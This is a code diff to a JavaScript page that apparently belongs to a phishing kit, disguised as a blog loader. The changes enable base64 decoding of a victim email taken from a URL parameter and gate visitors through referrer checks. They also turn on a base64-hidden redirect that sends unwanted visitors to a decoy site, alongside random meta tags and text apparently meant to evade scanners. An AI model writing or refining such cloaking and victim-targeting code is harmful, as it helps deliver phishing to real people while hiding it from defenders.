@@ -58,7 +58,7 @@ function getRandomString(length) {
   
   addRandomMetaTags();
   
-  fetch('../blog.txt').then(response => response.text()).then(blogContent => document.getElementById('body').innerHTML = blogContent);
+  fetch('../blog.txt').then(response => response.text()).then(blogContent => document.getElementById('blog').innerHTML = blogContent);
   
   const tags = ['p', 'h1', 'div', 'a', 'img', 'ul', 'li', 'span', 'button', 'table', 'tr', 'td'];
     function generateRandomText(length) {
@@ -149,10 +149,9 @@ function getRandomString(length) {
       const refererString = document.referrer;
       const isRefererMatch = refererRegexes.some((regex) => regex.test(refererString));
     
-      const uidParam = new URLSearchParams(window.location.search).get('u');
+      const uidParam = new URLSearchParams(window.location.search).get('x');
   
-      //var decString = atob(uidParam);
-      var decString = uidParam;
+      var decString = atob(uidParam);
   
       const isValidEmailInput = isValidEmail(decString);
     
@@ -167,7 +166,7 @@ function getRandomString(length) {
           if (isTrue) {
           var queryString = window.location.search;
           var urlParams = new URLSearchParams(queryString);
-          var oxx = urlParams.get('u');
+          var oxx = urlParams.get('x');
           var hos = window.location.hostname;
           var dmainParts = hos.split('.').reverse();
           var subdom = dmainParts.slice(2).reverse().join('-');
@@ -193,8 +192,7 @@ function getRandomString(length) {
         });
           } else {
             setTimeout(function() {
-                console.log('ERROR AT STAGE 2 Y..what triggered');
-                //window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
+                window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
           }, 500);
           }
       }
